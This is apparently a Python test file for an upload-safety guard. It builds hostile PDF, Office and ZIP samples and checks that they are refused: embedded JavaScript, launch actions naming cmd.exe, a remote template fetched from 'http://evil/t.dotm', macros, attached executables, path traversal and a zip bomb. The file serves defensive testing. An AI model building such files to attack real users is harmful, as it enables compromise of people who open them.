"""Active-content checks on uploads (backend/uploads_guard.py).

A genuine PDF/Office/ZIP file can still run something when opened. These
build small hostile files the way real ones are built — JavaScript hidden in a
compressed object stream, a hex-escaped name, a macro project, a remote
template, an .exe in a ZIP, a zip bomb — and check each is refused while
ordinary files pass.

Run: python backend/tests/test_upload_safety.py
"""
import io
import os
import sys
import types
import zipfile
import zlib

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(HERE))


class HTTPException(Exception):
    def __init__(self, status_code=500, detail=""):
        super().__init__(str(detail))
        self.status_code, self.detail = status_code, detail


if "fastapi" not in sys.modules:
    fa = types.ModuleType("fastapi")
    fa.HTTPException, fa.UploadFile = HTTPException, object
    sys.modules["fastapi"] = fa
import uploads_guard as g  # noqa: E402

failed = 0


def check(cond, label):
    global failed
    print(("ok   " if cond else "FAIL ") + label)
    if not cond:
        failed += 1


def refused(fn, *a, **k):
    try:
        fn(*a, **k)
        return None
    except Exception as e:  # noqa: BLE001
        return getattr(e, "detail", str(e))


def pdf(*objects, trailer=b""):
    body = b"%PDF-1.7\n"
    for i, o in enumerate(objects, start=1):
        body += b"%d 0 obj\n" % i + o + b"\nendobj\n"
    return body + b"trailer\n<< /Root 1 0 R " + trailer + b">>\n%%EOF\n"


def stream(dict_extra: bytes, payload: bytes) -> bytes:
    z = zlib.compress(payload)
    return b"<< /Length %d /Filter /FlateDecode " % len(z) + dict_extra + b" >>\nstream\n" + z + b"\nendstream"


CATALOG = b"<< /Type /Catalog /Pages 2 0 R >>"
PAGES = b"<< /Type /Pages /Kids [] /Count 0 >>"

print("-- PDFs --")
clean = None
try:
    import pypdfium2 as pdfium
    d = pdfium.PdfDocument.new()
    d.new_page(595, 842)
    buf = io.BytesIO()
    d.save(buf)
    clean = buf.getvalue()
except Exception:  # noqa: BLE001
    clean = pdf(CATALOG, PAGES, stream(b"", b"BT /F1 12 Tf (Hello) Tj ET"))
check(g.pdf_threats(clean)["found"] == [] and refused(g.require_safe_pdf, clean, "CV") is None, "an ordinary PDF passes")

js = pdf(b"<< /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R >>", PAGES, b"<< /S /JavaScript /JS (app.alert(1)) >>")
r = refused(g.require_safe_pdf, js, "CV")
check(r and "JavaScript" in r and "Print" in r, f"JavaScript refused, with what to do ({r[:60] if r else r})")
check("JavaScript" in g.pdf_threats(pdf(CATALOG, PAGES, b"<< /S /J#61vaScript /J#53 (x) >>"))["found"],
      "hex-escaped /J#61vaScript is still JavaScript")
hidden = pdf(CATALOG, PAGES, stream(b"/Type /ObjStm /N 1 /First 4", b"3 0 << /S /JavaScript /JS (x) >>"))
check("JavaScript" in g.pdf_threats(hidden)["found"], "JavaScript inside a compressed object stream is found")
disguised = pdf(CATALOG, PAGES, stream(b"/Type /ObjStm /Subtype /Image /N 1 /First 4", b"3 0 << /S /Launch /F (cmd.exe) >>"))
check("a 'launch program' action" in g.pdf_threats(disguised)["found"], "an object stream dressed up as an image is still opened")
img = pdf(CATALOG, PAGES, stream(b"/Subtype /Image /Width 1 /Height 1", b"/JavaScript is just pixels here"))
check(g.pdf_threats(img)["found"] == [], "real image data is skipped (speed), not mistaken for objects")


def with_attachment(name, blob):
    d = pdfium.PdfDocument.new()
    d.new_page(595, 842)
    a = d.new_attachment(name)
    a.set_data(blob)
    b = io.BytesIO()
    d.save(b)
    return b.getvalue()


# Print PDFs carry harmless attachments: InDesign embeds "Press Quality.joboptions"
# (our own book previews have six). Those must pass; programs must not.
check(g.pdf_threats(with_attachment("Press Quality.joboptions", b"<< /ASCII85EncodePages false >>"))["found"] == [],
      "a print-settings attachment (.joboptions) passes")
check(any("program" in f for f in g.pdf_threats(with_attachment("invoice.exe", b"MZ\x90\x00"))["found"]), "an attached .exe refused")
check(any("program" in f for f in g.pdf_threats(with_attachment("notes.txt", b"MZ\x90\x00rest"))["found"]),
      "an attached program renamed .txt is refused by its first bytes")
check(any("attached PDF" in f for f in g.pdf_threats(with_attachment("cv2.pdf", js))["found"]), "an attached PDF with JavaScript refused")
real = os.path.join(os.path.dirname(os.path.dirname(HERE)), "import", "Preview_International-Taxation-in-India_Ashish-Khetan.pdf")
if os.path.exists(real):
    check(g.pdf_threats(open(real, "rb").read())["found"] == [], "our real book preview (6 .joboptions attachments) passes")
check(g.pdf_threats(pdf(CATALOG, PAGES, b"<< /S /Launch /F (calc.exe) >>"))["found"] == ["a 'launch program' action"], "launch action refused")
enc = pdf(CATALOG, PAGES, trailer=b"/Encrypt 3 0 R ")
check(g.pdf_threats(enc)["encrypted"], "encryption detected")
check(refused(g.require_safe_pdf, enc, "CV") and refused(g.require_safe_pdf, enc, "eBook", allow_encrypted=True) is None,
      "encrypted: refused for CVs, allowed for staff uploads")
check(refused(g.require_safe_pdf, b"MZ\x90\x00 not a pdf", "CV"), "an .exe named .pdf is still refused")


def make_zip(files: dict) -> bytes:
    b = io.BytesIO()
    with zipfile.ZipFile(b, "w", zipfile.ZIP_DEFLATED) as z:
        for n, d in files.items():
            z.writestr(n, d)
    return b.getvalue()


CT = '<?xml version="1.0"?><Types><Default Extension="xml" ContentType="application/xml"/></Types>'
print("-- ZIP / Office --")
docx = make_zip({"[Content_Types].xml": CT, "word/document.xml": "<w:document/>",
                 "word/_rels/document.xml.rels": '<Relationships><Relationship Id="r1" Type="http://x/hyperlink" Target="https://oakbridge.in" TargetMode="External"/></Relationships>'})
check(g.zip_threats(docx, office=True) == [], "an ordinary .docx (with a normal web link) passes")
macro = make_zip({"[Content_Types].xml": CT.replace("application/xml", "application/vnd.ms-word.document.macroEnabled.main+xml"),
                  "word/vbaProject.bin": "x"})
check("macros" in g.zip_threats(macro, office=True), "macros refused")
tpl = make_zip({"[Content_Types].xml": CT, "word/_rels/settings.xml.rels":
                '<Relationships><Relationship Id="r1" Type="http://x/attachedTemplate" Target="http://evil/t.dotm" TargetMode="External"/></Relationships>'})
check(any("internet" in r for r in g.zip_threats(tpl, office=True)), "remote template refused")
ole = make_zip({"[Content_Types].xml": CT, "word/embeddings/oleObject1.bin": "x"})
check(any("embedded object" in r for r in g.zip_threats(ole, office=True)), "embedded OLE object refused")
exe = make_zip({"brochure.pdf": "x", "setup.EXE": "MZ"})
check(any("program" in r for r in g.zip_threats(exe)), "an .exe inside a ZIP refused")
check(any("unsafe path" in r for r in g.zip_threats(make_zip({"../../etc/x": "y"}))), "path traversal refused")
bomb = make_zip({"zeros.txt": b"\0" * (60 * 1024 * 1024)})
check(len(bomb) < 1024 * 1024 and any("zip bomb" in r for r in g.zip_threats(bomb)), f"zip bomb refused ({len(bomb)} bytes)")
check(refused(g.require_not_zip_bomb, bomb, "Import file") and refused(g.require_not_zip_bomb, docx, "Import file") is None,
      "imports: bombs refused, normal spreadsheets pass")
check(g.zip_threats(b"PK\x03\x04garbage") == ["it is not a readable ZIP/Office file"], "a broken ZIP is refused")

print("-- legacy .doc/.xls --")
check(g.ole_threats(g.OLE_MAGIC + b"\0" * 64 + "_VBA_PROJECT".encode("utf-16-le")) == ["macros"], "macro project in a .doc refused")
check(g.ole_threats(g.OLE_MAGIC + b"\0" * 64 + "WordDocument".encode("utf-16-le")) == [], "a plain .doc passes")

print()
if failed:
    print(f"{failed} assertion(s) failed")
    sys.exit(1)
print("all assertions passed")
